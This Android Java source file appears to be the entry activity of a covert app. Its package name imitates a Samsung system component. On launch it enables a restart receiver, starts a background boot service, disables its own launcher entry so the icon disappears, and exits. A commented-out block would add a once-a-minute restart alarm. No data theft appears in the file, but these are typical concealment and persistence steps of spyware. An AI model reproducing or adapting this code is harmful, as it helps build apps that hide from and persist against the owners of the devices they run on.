package com.sec.android.app.system.loopservice;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle; 
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.SystemClock;


public class main extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        ComponentName receiver = new ComponentName(this, restartReceiver.class);
        PackageManager pm = this.getPackageManager();

        pm.setComponentEnabledSetting(
            receiver,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        );

        Intent i = new Intent(this, bootService.class);
        ComponentName service = this.startService(i);


        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, main.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);


        /*
        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        Intent myIntent;
        PendingIntent pendingIntent;

        myIntent = new Intent(main.this, receiver.class);
        pendingIntent = PendingIntent.getBroadcast(this,0,myIntent,0);

        manager.setInexactRepeating
        (
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime()+3000,
                60*1000,
                pendingIntent
        );
        */

        finish();
    }
}
